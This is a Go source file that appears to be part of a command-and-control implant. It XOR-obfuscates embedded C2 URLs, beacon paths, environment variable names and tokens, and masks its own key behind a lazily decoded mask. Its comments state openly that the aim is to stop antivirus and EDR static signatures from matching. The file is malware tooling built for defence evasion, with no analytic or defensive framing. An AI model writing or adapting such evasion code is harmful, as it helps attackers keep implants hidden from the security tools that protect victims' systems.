// String obfuscation for baked-in C2 configuration literals. Values are XOR'd
// at build time so the compiled binary does not carry plaintext C2 URLs,
// beacon paths, env var names, or tokens that feed AV/EDR static signatures.
package main

import "sync"

// obfKey is stored as bytes XOR-masked with obfKeyMask so the raw key string
// (the raw key) never appears as a plaintext string in the binary.
// Anyone reversing xob() can still recover it, but plaintext static signature
// matching (strings scan for the XOR key) no longer fires.
const obfKeyMask byte = 0x5A

// obfKeyRaw holds the XOR-masked key bytes. We deliberately do NOT unmask it in
// an init() function: package-level var initializers (e.g. c2EndpointRe in
// failover.go) and other files' init() run in file-lexical order, so a
// traditional init() here is racy with the first xob() callers. Instead the key
// is unmasked lazily on first use via sync.Once, making decode order-agnostic.
var obfKeyRaw = []byte{
	0x6f, 0x6b, 0x6f, 0x63, 0x3b, 0x62, 0x39, 0x68,
	0x6e, 0x39, 0x38, 0x6d, 0x63, 0x3f, 0x6a, 0x6e,
	0x6f, 0x3f, 0x6a, 0x6e, 0x63, 0x63, 0x62, 0x63,
	0x3e, 0x3c, 0x68, 0x3f, 0x6f, 0x6a, 0x68, 0x62,
}

var (
	obfKeyOnce sync.Once
	obfKey     []byte
)

func getObfKey() []byte {
	obfKeyOnce.Do(func() {
		obfKey = make([]byte, len(obfKeyRaw))
		for i, b := range obfKeyRaw {
			obfKey[i] = b ^ obfKeyMask
		}
	})
	return obfKey
}

func xob(b []byte) string {
	k := getObfKey()
	out := make([]byte, len(b))
	for i := range b {
		out[i] = b[i] ^ k[i%len(k)]
	}
	return string(out)
}

